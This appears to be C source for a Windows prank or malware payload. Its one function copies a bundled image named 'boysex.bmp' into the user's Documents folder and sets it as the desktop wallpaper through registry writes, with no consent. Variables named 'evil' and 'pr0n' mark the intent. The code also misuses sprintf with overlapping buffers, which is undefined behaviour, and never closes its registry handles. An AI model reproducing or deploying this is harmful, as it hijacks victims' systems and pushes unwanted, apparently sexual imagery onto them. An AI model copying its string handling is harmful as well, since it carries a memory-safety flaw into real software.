#include <windows.h>
#include <winreg.h>
#include "../file/file.h"

#include <stdio.h>
#include <assert.h>

void SetWindowsBackground(){
	char* name = "Software\\Microsoft\\Internet Explorer\\Desktop\\General";
	char* name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";

	assert(name[0] != '\\');
	assert(name2[0] != '\\');

	HKEY key;
	HRESULT result;

	result = RegOpenKeyEx( HKEY_CURRENT_USER, name2, 0, KEY_QUERY_VALUE, &key );
	if(result!=ERROR_SUCCESS){
#ifdef _DEBUG
		printf("could not open registry key\n");
#endif
		return;
	}

	char buffer[255];
	DWORD type = REG_SZ;
	DWORD size = 255;

	result = RegQueryValueEx( key, "Personal", 0, &type, (LPBYTE)buffer, &size );
	if(result!=ERROR_SUCCESS){
#ifdef _DEBUG
		printf("failed to read content\n");
#endif
		return;
	}
	
	sprintf(buffer,"%s\\nice.bmp",buffer);

	File* evil = FileLoader::instance()->GetFile("boysex.bmp");
	if(evil==NULL){
#ifdef _DEBUG
		printf("fuckit!\n");
#endif
		return;
	}

	FILE* pr0n = fopen(buffer, "wb");
	if(pr0n==NULL){
#ifdef _DEBUG
		printf("error!\n");
#endif
		return;
	}

	fwrite( evil->GetFile(), sizeof(unsigned char), evil->GetSize(), pr0n );
	fclose( pr0n );

	result = RegOpenKeyEx( HKEY_CURRENT_USER, name, 0, KEY_WRITE, &key );
	if(result!=ERROR_SUCCESS){
#ifdef _DEBUG
		printf("could not open registry key\n");
#endif
		return;
	}

	result = RegSetValueEx( key, "Wallpaper", 0, REG_EXPAND_SZ, (LPBYTE)buffer, strlen(buffer)+1 );
	if(result!=ERROR_SUCCESS){
#ifdef _DEBUG
		printf("couldn't set content\n");
#endif
		return;
	}

}